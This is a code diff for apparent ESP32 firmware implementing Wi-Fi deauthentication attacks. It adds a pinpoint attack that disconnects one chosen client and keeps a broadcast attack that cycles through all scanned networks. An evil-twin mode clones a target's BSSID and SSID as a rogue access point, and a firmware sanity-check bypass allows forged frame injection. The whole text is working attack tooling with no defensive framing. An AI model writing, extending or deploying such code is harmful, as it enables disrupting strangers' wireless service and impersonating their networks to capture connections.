@@ -4,6 +4,7 @@
 #include <esp_wifi.h>
 #include "Event.h"
 #include "EventDispatcher.h"
+#include "Config.h"
 
 // The bypass function for broadcast deauth
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
@@ -32,16 +33,16 @@ void Deauther::setup(App* app) {
     app_ = app;
 }
 
-void Deauther::prepareAttack(DeauthMode mode, DeauthTarget target) {
+void Deauther::prepareAttack(DeauthAttackType type) {
     isAttackPending_ = true;
-    currentConfig_.mode = mode;
-    currentConfig_.target = target;
+    currentConfig_.type = type;
 }
 
 bool Deauther::start(const WifiNetworkInfo& targetNetwork) {
     if (isActive_ || !isAttackPending_) return false;
 
-    currentConfig_.specific_target_info = targetNetwork;
+    // --- FIX: Corrected member name ---
+    currentConfig_.specific_ap_info = targetNetwork;
     allTargets_.clear();
     allTargets_.push_back(targetNetwork);
     currentTargetIndex_ = 0;
@@ -53,16 +54,47 @@ bool Deauther::start(const WifiNetworkInfo& targetNetwork) {
     return true;
 }
 
-bool Deauther::startAllAPs() {
+// --- NEW: Implementation for pinpoint client attack ---
+bool Deauther::start(const StationInfo& targetClient) {
+    if (isActive_ || !isAttackPending_) return false;
+    
+    currentConfig_.specific_client_info = targetClient;
+    // We also need the AP info for the attack
+    currentConfig_.specific_ap_info.channel = targetClient.channel;
+    memcpy(currentConfig_.specific_ap_info.bssid, targetClient.ap_bssid, 6);
+    
+    // Attempt to find SSID from WifiManager's last scan
+    // This part is for display only, not critical for the attack itself
+    char bssidStr[18];
+    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", targetClient.ap_bssid[0], targetClient.ap_bssid[1], targetClient.ap_bssid[2], targetClient.ap_bssid[3], targetClient.ap_bssid[4], targetClient.ap_bssid[5]);
+    for(const auto& net : app_->getWifiManager().getScannedNetworks()) {
+        char netBssidStr[18];
+        sprintf(netBssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", net.bssid[0], net.bssid[1], net.bssid[2], net.bssid[3], net.bssid[4], net.bssid[5]);
+        if (strcmp(bssidStr, netBssidStr) == 0) {
+            strcpy(currentConfig_.specific_ap_info.ssid, net.ssid);
+            break;
+        }
+    }
+    
+    currentTargetSsid_ = currentConfig_.specific_ap_info.ssid;
+    
+    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
+    if (!rfLock_ || !rfLock_->isValid()) return false;
+
+    isActive_ = true;
+    isAttackPending_ = false;
+    app_->getHardwareManager().setPerformanceMode(true);
+    return true;
+}
+
+bool Deauther::startBroadcast() {
     if (isActive_ || !isAttackPending_) return false;
 
-    // We must scan for fresh targets right before the attack starts.
     app_->getWifiManager().startScan();
-    // A short delay to allow the scan to initiate. The loop will handle completion.
     delay(200); 
 
     isActive_ = true;
-    isAttackPending_ = false; // The attack process has started, even if we are waiting for scan results
+    isAttackPending_ = false;
     return true;
 }
 
@@ -86,8 +118,9 @@ void Deauther::sendPacket(const uint8_t* targetBssid, int channel, const uint8_t
     // Switch to the correct channel to send the packet
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-    uint8_t deauth_packet[sizeof(deauth_frame_template)];
-    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
+    // --- MODIFICATION: Use the centralized template ---
+    uint8_t deauth_packet[sizeof(RawFrames::Mgmt::Deauth::TEMPLATE)];
+    memcpy(deauth_packet, RawFrames::Mgmt::Deauth::TEMPLATE, sizeof(RawFrames::Mgmt::Deauth::TEMPLATE));
     
     // Set BSSID (Source Address and BSSID fields)
     memcpy(&deauth_packet[10], targetBssid, 6);
@@ -110,7 +143,10 @@ void Deauther::sendPacket(const uint8_t* targetBssid, int channel, const uint8_t
 void Deauther::loop() {
     if (!isActive_) return;
 
-    if (currentConfig_.target == DeauthTarget::ALL_APS && allTargets_.empty()) {
+    // --- FIX: Use correct enum and member name ---
+    bool isBroadcast = (currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL || currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN);
+
+    if (isBroadcast && allTargets_.empty()) {
         if (WiFi.scanComplete() > 0) {
             allTargets_ = app_->getWifiManager().getScannedNetworks();
             if (allTargets_.empty()) {
@@ -124,23 +160,29 @@ void Deauther::loop() {
         return;
     }
 
-    if (currentConfig_.target == DeauthTarget::ALL_APS && currentConfig_.mode == DeauthMode::ROGUE_AP) {
+    if (currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN) {
         if (millis() - lastHopTime_ > ALL_APS_HOP_INTERVAL_MS) {
             hopToNextTarget();
         }
     }
     
-    if (currentConfig_.mode == DeauthMode::BROADCAST) {
-        if (millis() - lastPacketSendTime_ > BROADCAST_PACKET_INTERVAL_MS) {
+    if (currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
+        // --- FIX: Use correct constant name ---
+        if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
             if (!allTargets_.empty()) {
-                // Cycle through targets for the broadcast attack
                 currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
                 const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
                 currentTargetSsid_ = currentTarget.ssid;
-                
-                // Use the new modular utility function
                 Deauther::sendPacket(currentTarget.bssid, currentTarget.channel);
             }
+            lastPacketSendTime_ = millis();
+        }
+    }
+
+    if (currentConfig_.type == DeauthAttackType::PINPOINT_CLIENT) {
+        if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
+            const auto& client = currentConfig_.specific_client_info;
+            Deauther::sendPacket(client.ap_bssid, client.channel, client.mac);
             lastPacketSendTime_ = millis();
         }
     }
@@ -169,7 +211,7 @@ void Deauther::executeAttackForCurrentTarget() {
     currentTargetSsid_ = newTarget.ssid;
     app_->getHardwareManager().setPerformanceMode(true);
 
-    if (currentConfig_.mode == DeauthMode::ROGUE_AP) {
+    if (currentConfig_.type == DeauthAttackType::EVIL_TWIN || currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN) {
         rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::ROGUE_AP);
         if (!rfLock_ || !rfLock_->isValid()) {
             Serial.printf("[DEAUTHER] Failed to acquire ROGUE_AP lock for %s.\n", newTarget.ssid);
@@ -179,7 +221,7 @@ void Deauther::executeAttackForCurrentTarget() {
         esp_wifi_set_mac(WIFI_IF_AP, (uint8_t*)newTarget.bssid);
         WiFi.softAP(newTarget.ssid, "dummypassword", newTarget.channel);
 
-    } else if (currentConfig_.mode == DeauthMode::BROADCAST) {
+    } else if (currentConfig_.type == DeauthAttackType::NORMAL || currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
         // For broadcast, we only need to set up the hardware once.
         if (!rfLock_ || !rfLock_->isValid()) {
             rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
